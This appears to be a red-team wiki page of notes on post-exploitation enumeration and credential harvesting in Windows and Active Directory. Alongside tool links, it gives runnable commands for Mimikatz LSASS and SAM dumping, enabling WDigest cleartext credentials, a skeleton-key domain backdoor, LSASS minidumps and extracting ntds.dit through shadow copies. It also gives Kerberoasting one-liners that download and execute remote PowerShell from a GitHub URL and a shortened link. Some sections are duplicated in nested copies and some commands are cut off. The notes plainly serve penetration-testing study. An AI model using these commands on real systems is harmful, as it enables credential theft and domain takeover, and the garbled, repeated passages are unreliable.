---
description: All the ways to grab the goodies
---

# Enumeration and Harvesting

## **Post Exploitation Tasks**

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

{% content-ref url="meterpreter-post-auth-runbook.md" %}
[meterpreter-post-auth-runbook.md](meterpreter-post-auth-runbook.md)
{% endcontent-ref %}

## **Enumeration**

{% tabs %}
{% tab title="Guides" %}
* [https://www.ired.team/offensive-security/enumeration-and-discovery](https://www.ired.team/offensive-security/enumeration-and-discovery)
* [http://pwnwiki.io/#!presence/windows/blind.md](http://pwnwiki.io/#!presence/windows/blind.md) - Windows Blind files to search for as an attacker
* [http://pwnwiki.io/#!presence/linux/blind.md](http://pwnwiki.io/#!presence/linux/blind.md) - Linux Blind files
* [http://pwnwiki.io/#!presence/windows/windows\_cmd\_config.md](http://pwnwiki.io/#!presence/windows/windows\_cmd\_config.md) - Commands that display information about the configuration of the victim and are usually executed from the context of the `cmd.exe` or `command.exe` prompt.
* [http://pwnwiki.io/#!presence/windows/network.md](http://pwnwiki.io/#!presence/windows/network.md) - Windows commands to help you gather information about the victim system's network connections, devices and capabilities.
{% endtab %}

{% tab title="Endpoint Tools" %}
* [JAWS](https://github.com/411Hall/JAWS) - JAWS is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It
* [RedTeamScripts](https://github.com/threatexpress/red-team-scripts) - Red Team Scripts is a collection of red teaming related tools, scripts, techniques, and notes developed or discovered over time during engagements. Invoke-HostEnum is the tool within these scripts that can perform windows host enumeration for any valuable data.
* [HostRecon](https://github.com/dafthack/HostRecon) - Invoke-HostRecon runs a number of checks on a system to help provide situational awareness to a penetration tester during the reconnaissance phase of an engagement. It gathers information about the local system, users, and domain information. It does not use any 'net', 'ipconfig', 'whoami', 'netstat', or other system commands to help avoid detection.
{% endtab %}
{% endtabs %}

#### AD Enumeration

[https://attl4s.github.io/assets/pdf/Understanding\_Active\_Directory\_Enumeration.pdf](https://attl4s.github.io/assets/pdf/Understanding\_Active\_Directory\_Enumeration.pdf)

{% tabs %}
{% tab title="Tools" %}
* [ADExplorer by Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) - An advanced Active Directory (AD) viewer and editor. You can use AD Explorer to easily navigate an AD database, define favorite locations, view object properties and attributes without having to open dialog boxes, edit permissions, view an object's schema, and execute sophisticated searches that you can save and re-execute.
* [ADRecon](https://github.com/adrecon/ADRecon) - ADRecon is a tool which extracts and combines various artifacts (as highlighted below) out of an AD environment.
* [ACLight](https://github.com/cyberark/ACLight) -A tool for advanced discovery of Privileged Accounts - including Shadow Admins.
* [TruffleSnout](https://github.com/dsnezhkov/TruffleSnout) - Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration.
{% endtab %}

{% tab title="SPN Scanning" %}
* [SPN Scanning – Service Discovery without Network Port Scanning](https://adsecurity.org/?p=1508)
* [Active Directory: PowerShell script to list all SPNs used](https://social.technet.microsoft.com/wiki/contents/articles/18996.active-directory-powershell-script-to-list-all-spns-used.aspx)
* [Discovering Service Accounts Without Using Privilege](https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/)
{% endtab %}

{% tab title="Data Mining" %}
* [A Data Hunting Overview](https://thevivi.net/2018/05/23/a-data-hunting-overview/)
* [Push it, Push it Real Good](https://www.harmj0y.net/blog/redteaming/push-it-push-it-real-good/)
* [Finding Sensitive Data on Domain SQL Servers using PowerUpSQL](https://blog.netspi.com/finding-sensitive-data-domain-sql-servers-using-powerupsql/)
* [Sensitive Data Discovery in Email with MailSniper](https://www.youtube.com/watch?v=ZIOw\_xfqkKM)
* [Remotely Searching for Sensitive Files](https://www.fortynorthsecurity.com/remotely-search/)
* [I Hunt Sysadmins - harmj0y](http://www.harmj0y.net/blog/penetesting/i-hunt-sysadmins/)
{% endtab %}

{% tab title="User Hunting" %}
* [Active Directory Recon Without Admin Rights](https://adsecurity.org/?p=2535)
* [Gathering AD Data with the Active Directory PowerShell Module](https://adsecurity.org/?p=3719)
* [Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode](http://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html)
* [PowerUpSQL Active Directory Recon Functions](https://github.com/NetSPI/PowerUpSQL/wiki/Active-Directory-Recon-Functions)
* [Derivative Local Admin](https://medium.com/@sixdub/derivative-local-admin-cdd09445aac8)
* [Automated Derivative Administrator Search](https://wald0.com/?p=14)
* [Dumping Active Directory Domain Info – with PowerUpSQL!](https://blog.netspi.com/dumping-active-directory-domain-info-with-powerupsql/)
* [Local Group Enumeration](https://www.harmj0y.net/blog/redteaming/local-group-enumeration/)
* [Situational Awareness](https://pentestlab.blog/2018/05/28/situational-awareness/)
* [Commands for Domain Network Compromise](https://www.javelin-networks.com/static/5fcc6e84.pdf)
* [A Pentester’s Guide to Group Scopin](https://www.harmj0y.net/blog/activedirectory/a-pentesters-guide-to-group-scoping/)
{% endtab %}

{% tab title="LAPS" %}
* [Microsoft LAPS Security & Active Directory LAPS Configuration Recon](https://adsecurity.org/?p=3164)
* [Running LAPS with PowerView](https://www.harmj0y.net/blog/powershell/running-laps-with-powerview/)
* [RastaMouse LAPS Part 1 & 2](https://rastamouse.me/tags/laps/)
{% endtab %}

{% tab title="ADFS" %}
* [118 Attacking ADFS Endpoints with PowerShell Karl Fosaaen](https://www.youtube.com/watch?v=oTyLdAUjw30)
* [Using PowerShell to Identify Federated Domains](https://blog.netspi.com/using-powershell-identify-federated-domains/)
* [LyncSniper: A tool for penetration testing Skype for Business and Lync deployments](https://github.com/mdsecresearch/LyncSniper)
* [Troopers 19 - I am AD FS and So Can You](https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you)
{% endtab %}
{% endtabs %}

{% hint style="info" %}
Privilege escalation tools can also provide much of the enumeration that you need.
{% endhint %}

{% content-ref url="../privilege-escalation/" %}
[privilege-escalation](../privilege-escalation/)
{% endcontent-ref %}

## **Harvesting and Credential Dumping**

iRedTeam blog - [https://www.ired.team/offensive-security/credential-access-and-credential-dumping](https://www.ired.team/offensive-security/credential-access-and-credential-dumping)

### Endpoint Tools

{% tabs %}
{% tab title="Endpoint Tools" %}
* [PassHunt](https://github.com/Dionach/PassHunt) - PassHunt searches drives for documents that contain passwords or any other regular expression. It's designed to be a simple, standalone tool that can be run from a USB stick.
* [SessionGopher](https://github.com/Arvanaghi/SessionGopher) - SessionGopher is a PowerShell tool that finds and decrypts saved session information for remote access tools. It has WMI functionality built in so it can be run remotely. Its best use case is to identify systems that may connect to Unix systems, jump boxes, or point-of-sale terminals.
* [CredDump](https://github.com/moyix/creddump) - Tool for dumping credentials and secrets from Windows Registry Hives.
  * [https://www.kali.org/tools/creddump7/](https://www.kali.org/tools/creddump7/)
* [dumpsterdiver](https://www.kali.org/tools/dumpsterdiver/) - This package contains a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords.
* [polenum](https://www.kali.org/tools/polenum/) - polenum is a Python script which uses the Impacket Library from CORE Security Technologies to extract the password policy information from a windows machine.
* [powersploit](https://www.kali.org/tools/powersploit/) - PowerSploit is a series of Microsoft PowerShell scripts that can be used in post-exploitation scenarios during authorized penetration tests.
* [pspy](https://github.com/DominicBreuker/pspy) - Monitor linux processes without root permissions
* [swap\_digger](https://github.com/sevagas/swap\_digger) - swap\_digger is a tool used to automate Linux swap analysis during post-exploitation or forensics. It automates swap extraction and searches for Linux user credentials, web forms credentials, web forms emails, http basic authentication, Wifi SSID and keys, etc.
* [https://highon.coffee/blog/linux-local-enumeration-script/](https://highon.coffee/blog/linux-local-enumeration-script/)
* [Masky](https://github.com/Z4kSec/Masky) - Python library with CLI allowing to remotely dump domain user credentials via an ADCS without dumping the LSASS process memory
  * [https://z4ksec.github.io/posts/masky-release-v0.0.3/](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
* [MimiPenguin](https://github.com/huntergregal/mimipenguin) - A tool to dump the login password from the current linux desktop user.
* [Internal-Monologue](https://github.com/eladshamir/Internal-monologue) - Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS
{% endtab %}

{% tab title="LaZagne" %}
### [LaZagne](https://github.com/AlessandroZ/LaZagne)&#x20;

LaZagne is an open-source tool used in post-exploitation to recover stored passwords on a system. Its modules support Windows, Linux, and OSX, but are primarily intended for Windows systems.\
Software uses different techniques to save credentials, such as saving them to a plaintext file, local databases or credential managers. LaZagne is able to search for these common methods and retrieve any passwords it finds.\
LaZagne is capable of extracting passwords from 87 different software applications from the following categories of software:\
Browsers, Chats, Databases, Games, Git, Mails, Maven, Dumps from memory, Multimedia, PHP, SVN, Sysadmin, WIFI, and  Internal mechanism password storage\
The LaZagne tool along with a full list of software that it supports is available in the [public GitHib repository](https://github.com/AlessandroZ/LaZagne).

[https://www.youtube.com/watch?v=AwFyiFOXrd0](https://www.youtube.com/watch?v=AwFyiFOXrd0)\
\
**Using LaZagne on Windows**

LaZagne's ability to retrieve stored credentials for Windows software is extensive and supports a large number of browsers including Chrome and Firefox, chat clients including Skype, databases, and mail clients including Outlook.\
The tool also supports credential retrieval for many sysadmin utilities like OpenVPN and OpenSSH, and password managers such as KeyPass, which could provide valuable credentials for moving to other hosts in a network.\
\
**Usage**

The Windows version comes with an executable (.exe) file that can be used as a standalone .exe; however, it is not able to detect some credentials such as Google Chrome passwords.\
Simply double clicking on the executable ‘Lazagne.exe' will cause a warning message which indicates that the executable is malicious.&#x20;

* To run the tool successfully, use the command prompt to execute LaZagne:
  * `> lazagne.exe`
  * &#x20;`# Run all modules`
    * `> lazagne.exe all`
  * `# Run the browser modules`
    * `lazagne.exe browsers`
* There is also a Python script in the Windows directory of the LaZagne repository that can run on systems with Python installed. There are a few requirements that may need to be installed first – check the requirements.txt file in the repository for more details.
  * `#python laZagne.py`
  * `# Run all modules`
    * `python laZagne.py all`
  * `# Run modules for Google Chrome. Add the -v flag for verbose output`
    * `python laZagne.py browsers -google -v`
{% endtab %}

{% tab title="Mimikatz" %}
{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md" %}



Pulls credentials out of LSASS

* Can be run im memory so you dont drop and executable on the target
* Commands - will give clear text pw of currently logged in users
  * \> C:\Tools\password\_attacks\mimikatz.exe
  * \# privilege::debug
  * \# token::elevate #elevate session to SYSTEM level
  * \# kerberos
  * \# wdigest
  * \# lsadump::sam #Dump SAM database
* Windows 10 issue - Mimikatz will pull a NULL value when pulling creds as they are no longer in LSASS
  * Set registry key to put the credentials back into LSASS
    * \> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f
  * Empire Command version
    * \>shell reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1 /f
  * You will need the user to relog into the system for this to take affect. Force this by locking thier workstation.
    * rundll32.exe user32.dll,LockWorkStation
* Mimikatz NTLM hash of all users
  * \#reg save hklm\sam filename1.hiv
  * \#reg save hklm\security filename2.hiv
  * mimikatz#privilege::debug
  * mimikatz#token::elevate
  * mimikatz#log hash.txt
  * mimikatz#lsadump::sam filename1.hiv filename2.hiv
* Mimikittenz
  * POC style tool that utilizes windows function ReadProcessMemory() to extract plain text passwords from various targets such as browsers
  * Search queries preloaded for Gmail, O365, Jira, github, bugzilla,zendesk, Cpanel, Dropbox, onedrive, AWS, SLack, Twitter, and Facebook
  * Does not require Local admin, it runs in Userland mem
  * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
  * Back door a privileged AD account with Mimikatz
  * To install the skeleton key
    * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
  * Use
    * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
    * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
    * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
    * Back door a privileged AD account with Mimikatz
    * To install the skeleton key
      * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
    * Use
      * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
      * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
      * [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
      * Back door a privileged AD account with Mimikatz
      * To install the skeleton key
        * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
      * Use
        * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
        * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
{% endtab %}
{% endtabs %}

### Endpoint Techniques

{% tabs %}
{% tab title="Dumping w/o LSASS" %}
* [https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz](https://ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)
* [Dumping Lsass.exe to Disk Without Mimikatz and Extracting Credentials - Red Teaming Experiments](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)&#x20;
* [https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)
* ProcDump
  * \>procdump.exe -accepteula -ma lsass.exe lsass.dmp
    * will need local admin to dump LSASS
  * Create dump file by using options within tasklist
  * Executing a native comsvcs.dll DLL found in Windows\system32 with rundll32:
    * .\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp fu
{% endtab %}

{% tab title="Skeleton Key" %}
* [http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis](http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis)
* Back door a privileged AD account with Mimikatz
* To install the skeleton key
  * \>mimikatz.exe “privilege::debug” “misc::skeleton” exit
* Use
  * \>net use \* \\\dc\c$ mimikatz /user:lab@attacker.domain
  * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/credential\_extraction/)
{% endtab %}

{% tab title="Vol. Shadow Copy" %}


Once you have Domain Admin access, the old way to pull all hashes from the DC was to run commands on the domain controller and user Shadow volume or Raw copy to pull the ntds.dit file

* _RTFM: Volume Shadow Copy - pg.21_
* Volume Shadow Copy technique (old)
  * NTDS.dit file is constantly being locked as in use by the OS.
  * We can use Volume Shadow Copy to make an copy of it we can extract hashes from
    * C:\vssadmin create shadow /for=C:
    * copy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[DISK\_NUMBER]\windows\ntds\ntds.dit
    * copy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[DISK\_NUMBER]\windows\system32\config\SYSTEM
    * copy \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy\[DISK\_NUMBER]\windows\system32\config\SAM
    * reg SAVE HKLM\SYSTEM c:\SYS
    * vssadmin delete shadows /for=\[/oldest | /all | /shadow=]
* ALT
  * Volume Shadow Copy
    * \#vssadmin list shadows
      * \#set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
      * \#for /R %VSHADOW\_DEVICE%\ %i in (\*) do @echo %i
      * &#x20;[https://blogs.msdn.microsoft.com/adioltean/2004/12/14/creating-shadow-copies-from-the-command-line/](https://blogs.msdn.microsoft.com/adioltean/2004/12/14/creating-shadow-copies-from-the-command-line/)
* Listing shadow copy contents. This is tricky since the shadow copies are not regular (standalone) volumes. These are pseudo-volume devices, without a drive letter or volume name, in the form \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyNNN. You can still access their contents from the command line, if you know how. For example, copying a file from the shadow copy can be done this way:
  * dir > c:\somefile.txt
  * &#x20;vssadmin create shadow /for=c:
  * &#x20;vssadmin list shadows
  * &#x20;(get the shadow copy device, let's say that this is \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12)
  * &#x20;set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
  * &#x20;copy %VSHADOW\_DEVICE%\somefile.txt c:\somefile\_bak.txt
* To enumerate all files on a shadow copy device we will use the "for /R" command. Note that we used %i and not %%i so the command below will not work properly in a CMD batch file:
  * dir > c:\somefile.txt
  * vssadmin create shadow /for=c:
  * vssadmin list shadows
  * (get the shadow copy device, let's say that this is \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12)
  * set VSHADOW\_DEVICE=\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12
  * for /R• %VSHADOW\_DEVICE%\ %i in (\*) do @echo %i
{% endtab %}

{% tab title="NinjaCopy" %}
NinjaCopy [http://bit.ly/2HpvKwj](http://bit.ly/2HpvKwj)

* Copies file from an NTFS partition volume by reading the raw volume and parsing the NTFS Strucutres
* This bypasses file DACL's, read handle blocks, and SACL's
* This can be used to read SYSTEM files that are normally locked like NTDS.dit registry hives
* \> Invoke-NinjaCopy -Path “c:\Windows\ntds\ntds.dit” -LocalDestination "c:\Windows\temp\ntds.di
{% endtab %}

{% tab title="DCSync" %}
DCSync (Modern)

* Impersonates the DC and requests hashes of all users on the domain
* No need to touch the DC at all!!
* Must have proper permissions: Domain Admins/Enterprise Admins/DC groups/ anyone with Replicating Changes permissions seg to All
{% endtab %}
{% endtabs %}

#### Windows Service Extraction

{% tabs %}
{% tab title="Windows Native Tooling" %}
* WCE - Windows Credential Editor
  * Lists windows logon sessions and add/change/delete associated credentials
* Windows credential manager
  *   [https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.p](https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1)

      Group Policy Preference Vul

      * Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
      * Uses a publiclally posed Microsoft AES , easy to find, easy to use
      * Exploit available Under powersploit script Get-GPPPassword.ps1
      * Metasploit module
        * \>use post/windows/gather/credentials/gpp
        * \>set SESSION \[Session # of your shell]
        * \>exploit
      *   [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)

          Group Policy Preference Vul

          * Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
          * Uses a publiclally posed Microsoft AES , easy to find, easy to use
          * Exploit available Under powersploit script Get-GPPPassword.ps1
          * Metasploit module
            * \>use post/windows/gather/credentials/gpp
            * \>set SESSION \[Session # of your shell]
            * \>exploit
          * [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)
{% endtab %}

{% tab title="GPP Vuln" %}
Group Policy Preference Vul

* Info for accounts under GPP stored in a Groups.xml file that contains cpassword hash.
* Uses a publiclally posed Microsoft AES , easy to find, easy to use
* Exploit available Under powersploit script Get-GPPPassword.ps1
* Metasploit module
  * \>use post/windows/gather/credentials/gpp
  * \>set SESSION \[Session # of your shell]
  * \>exploit
* [http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py](http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py)
{% endtab %}

{% tab title="Cached Creds" %}
Windows Cached Credentials

* Windows caches the last 10 sets of credentials used on the device by default
* Metasploit module - cachedump
* Crack via hashcat
  * format: $DCC2$10240#account\_name#hash
  * oclHashcat64.exe -m 2100 hashes \mscash2.txt lists \crackstat\_realhuman\_shill.txt
  * Warning: With a normal GPU this takes on average 20 days to crack
{% endtab %}

{% tab title="PW Filter DLL" %}


Password FIlter DLL - used by Windows to enforce password strength policies.

* System administrators can create password filter DLLs to ensure all password changes meet a minimum requirement.
* New passwords are passed to the DLL in plaintext, allowing attackers to leverage this Windows feature to steal credentials.
* Password changes on Windows are handled by the Local Security Authority (LSA). When a password change occurs, the LSA executes each registered password filter to check that the new passwords meets the specified requirements.
* Each password filter must return ‘true’ for the password change to occur; if any of the filters return ‘false’, an error is displayed to the user. Password filters can be installed locally or on domain controllers (DCs).
* Password filters are created as DLL files and placed in the ‘C:\Windows\System32’ directory.
* Once in place, the new file must be registered by adding its name (without the .dll extension) to the registry entry `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages`.
* The DLL file is comprised of three functions, each of which performs a specific task when executed.
  * `InitializeChangeNotify` is called to notify the filter that a password change has been requested. This function returns true or false to indicate whether if the filter has initialised successfully.
  * &#x20;`PasswordFilter` is called to validate the new password. This function contains the code to test the provided password and returns true or false to indicate if the password is valid.
  * `PasswordChangeNotify` is called to inform the filter if the password change was made successfully.
* Password filter DLLs can be used by malicious actors to harvest account credentials. The `PasswordFilter` and `PasswordChangeNotify` functions both have access to the plaintext password and the name of the account whose password is to be changed. By installing a malicious password filter, attackers can exfiltrate every updated password to a remote server, local file or even block every password change by setting their filter’s `PasswordFilter` function to always return false.
* Ensuring that appropriate permissions are set for the `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Notification Packages` key will prevent unauthorized users or groups from being able to register new filter
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Kerberoasting" %}


Kerberoasting

* Any ticeket can be requested by any user with kerberos, from the domain controller
* Those tickets are encrypted with the NTLM hash of the associated service user.
* If we can guess the password to teh associated service user's NTLM hash, then we now know the password to the actual service account
* Steps:
  * &#x20;List all SPN services. These are the service accounts for which we are going to pull all the kerberos tickets
    * \>setspn -T \[domain] -F -Q \*/\*
  * &#x20;Next we target either a single user SPN or pull all the user Kerberos tickets into our user's memory
    * Single target
      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList “HTTP/\[hostname].\[domain].local”
    * All User tickets
      * \>powershell Add-Tpe -AssemblyName System.IdentityModel; IEX (New-Object Net.WebClient).DownloadString("https://githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1") | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArguementList $\_.ServicePrincipalName}catch{}
    * &#x20;And the powersploit tool to automate this!
      * [https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
    * Now we have our tickets imported into memory and we need to extract them.
      * Mimikatz Kerberoast export:
      * \>powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH'); Invoke-Mimikatz -Command ‘’'''''kerberos::list /export'''''''
      * Once extracted and on our victims machine and we can start cracking them!
        * use tgsrepcrack.p
{% endtab %}

{% tab title="Second Tab" %}

{% endtab %}
{% endtabs %}

{% content-ref url="ad-remote-harvesting.md" %}
[ad-remote-harvesting.md](ad-remote-harvesting.md)
{% endcontent-ref %}

<details>

<summary>Command Reference</summary>

* General Enumeration
  * _RTFM: Linux System Info - pg. 5_
  * _BTFM: Linux System Info - pg. 71_
  * _RTFM: Windows System Info - pg. 15_
  * _BTFM: Windows System Info - pg. 60_
  * _RTFM: WMI  Info - pg. 20_
  * _RTFM: Powershell Info - pg. 22_
  * _RTFM: Registry Locations - pg. 26_
* Host Enumeration
  * Browser Information
    * _PTFM: Browser Information- pg. 46_
  * Virtual Machine Detection
    * _PTFM: Windows VM Detection - pg. 47_
    * _PTFM: Linux VM Detection - pg. 106_
  * Searching for cleartext passwords
    * _PTFM: Windows Cleartext Passwords - pg. 40_
    * _PTFM: Linux Cleartext Passwords - pg. 102_
  * Credential Dumping
    * _PTFM: Windows Credential Dumping - pg. 41_
    * _PTFM: Linux Credential Dumping - pg. 102_
  * Firewall settings
    * _BTFM: Windows Firewall - pg. 22_
    * _BTFM: Linux Firewall - pg. 35_
* Active Directory
  * _BTFM: AD Inventory - pg. 16_
* Email collection
  * _PTFM: Email Collection - pg. 59_

</details>

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

## Misc

* [SlackPirate](https://github.com/emtunc/SlackPirate) - Slack Enumeration and Extraction Tool - extract sensitive information from a Slack Workspace
* Copy a locked file - [https://github.com/GhostPack/Lockless](https://github.com/GhostPack/Lockless)
